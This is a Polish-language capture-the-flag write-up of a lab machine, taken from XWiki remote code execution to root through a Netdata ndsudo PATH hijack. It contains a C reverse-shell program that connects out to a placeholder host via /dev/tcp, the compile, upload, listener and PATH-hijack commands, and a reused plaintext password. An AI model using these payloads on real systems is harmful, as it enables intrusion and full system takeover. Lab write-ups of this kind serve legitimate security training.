pierwsze co zrobilem to przeskanowalem ip nmapem ![[Pasted image 20250817150407.png]] mamy port 8080, a on jest podatny na exploita 
# CVE-2025–24893 
remote code execution (RCE)
--------------------------------------------- 
nastepnie uzywamy tego exploita i jestesmy w stanie uzyskac reverse shell ![[Pasted image 20250817151443.png]] Teraz jestesmy userem xwiki potrzebujemy zdobyc eksalacje uprawnien do innego uzytkownika w sciezce znalezlismy pojedynczy katalog uzytkownika o nazwie Oliver więc ustalilismy, że jest to następny cel `/home` Po rozejrzeniu sie po plikach xwiki znalezlismy haslo w `/etc/xwiki/hibernate.cfg.xml` 

![[Pasted image 20250817152623.png]]
`theEd1t0rTeam99`
 Dzieki temu mamy dostep do olivera i mozemy uzyskac flage user 
![[Pasted image 20250817153438.png]]
-------------------------------------------------------------------------- 
# Eskalacja 
uprawnień Uruchomienie pokazało, że Oliver nie ma uprawnień do uruchamiania żadnego polecenia jako root — żadnych plików binarnych z podwyższonymi uprawnieniami jak to czasami ma miejsce na innych maszynach.`sudo -l` 

![[Pasted image 20250817153841.png]] 

Poniewaz mialem teraz dostep SSH sprawdzilem uslugi wewnetrzne poprzez kierowanie portow 

![[Pasted image 20250817154035.png]] 
Po sprawdzeniu lokalnych portow zobaczylem, ze port 127.0.0.1:19999 jest uzywany przez netdata utworzylem tunel SSH: `19999`

---------------------------------
**W momencie, gdy otworzyłem stronę internetową Netdata, pojawiło się duże ostrzezenie mówiące że wersja jest nieaktualna — świetna wskazówka że może byc podatna na ataki 
# CVE-2024–32019 
Ta luka w zabezpieczeniach Umożliwia lokalną eskalację uprawnień (LPE)**

Możemy stworzyć fałszywy plik binarny, który jest wykonywany zamiast prawdziwego, gdy próbuje wywołać .`nvme``ndsudo``nvme-list` **O to prosty zlosliwy program w C, ktory to wykona

```
c
#include <unistd.h> 
#include <stddef.h> 

int main() {  
    setuid(0);  
    setgid(0);  
    execl("/bin/bash", "bash", "-c", "bash -i >& /dev/tcp/YOUR_IP/YOUR_PORT 0>&1", NULL);  
    return 0;  
}
```

Kompilujemy to statycznie aby uniknac problemow <pre> x86_64-linux-gnu-gcc -o nvme exploit.c -static </pre> Nastepnie przeslij to na komputer ofiary upewnij sie ze jest wykonywalny i ustaw zmienna tak aby nasza podrobka zostala znaleziona jako pierwsza `scp nvme oliver@10.10.11.80:/home/oliver/` **Ustaw listening `nc -lvnp port`

```
chmod +x nvme
PATH=$(pwd):$PATH /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list
```

![[Zrzut ekranu 2025-08-17 163515.png]]

**Po wykonaniu uruchamiana jest nasza odwrotna powłoka i **otrzymujemy root** `ndsudo` I **potem tylko `cat /root/root.txt` **i koniec! 

-------------------------------

![[Pasted image 20250817163802.png]]